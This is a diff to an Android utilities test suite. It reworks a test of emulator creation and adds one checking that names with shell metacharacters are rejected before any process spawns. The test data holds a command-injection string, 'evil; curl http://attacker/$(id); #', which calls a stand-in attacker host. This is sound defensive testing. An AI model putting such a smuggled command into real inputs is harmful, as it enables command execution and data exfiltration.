@@ -477,7 +477,7 @@ describe('Android utils', () => {
         expect(sdkRoot?.rootLocation).to.be.equal(mockAndroidHome);
     });
 
-    it('createNewVirtualDevice passes untrusted values as inert argv elements (no shell)', async () => {
+    it('createNewVirtualDevice passes a legitimate name as an inert argv element (no shell)', async () => {
         // A fake child process whose stdout immediately emits data so the promise resolves.
         const fakeChild = new EventEmitter() as EventEmitter & {
             stdin: { setDefaultEncoding: () => void; write: () => void };
@@ -494,15 +494,30 @@ describe('Android utils', () => {
 
         setTimeout(() => fakeChild.stdout.emit('data', 'ok'), 10);
 
-        const malicious = 'evil; curl http://attacker/$(id); #';
-        await AndroidUtils.createNewVirtualDevice(malicious, 'google_apis', 'android-33', 'pixel', 'x86_64');
+        await AndroidUtils.createNewVirtualDevice('Pixel 5 API 33', 'google_apis', 'android-33', 'pixel', 'x86_64');
 
         expect(spawnChildStub.calledOnce).to.be.true;
         const [, args] = spawnChildStub.getCall(0).args as [string, string[]];
-        // Blanks are replaced with underscores, but metacharacters must survive intact and be
-        // carried as a single argv element (never split or interpreted by a shell).
-        expect(args).to.include(malicious.replace(/ /gi, '_'));
+        // Blanks are replaced with underscores, and each value is carried as a single argv element.
+        expect(args).to.include('Pixel_5_API_33');
         expect(args).to.include('system-images;android-33;google_apis;x86_64');
+    });
+
+    it('createNewVirtualDevice rejects an emulator name containing shell metacharacters', async () => {
+        const spawnChildStub = stubMethod($$.SANDBOX, AndroidUtils, 'spawnChild');
+        const malicious = 'evil; curl http://attacker/$(id); #';
+
+        let caught: unknown;
+        try {
+            await AndroidUtils.createNewVirtualDevice(malicious, 'google_apis', 'android-33', 'pixel', 'x86_64');
+        } catch (error) {
+            caught = error;
+        }
+
+        expect(caught).to.be.an('error');
+        expect((caught as Error).message).to.match(/cannot be safely used/i);
+        // Must fail fast: no attempt to build or spawn the command.
+        expect(spawnChildStub.called).to.be.false;
     });
 
     it('spawnChild passes a malicious argv element inertly (no shell interpretation)', async function () {
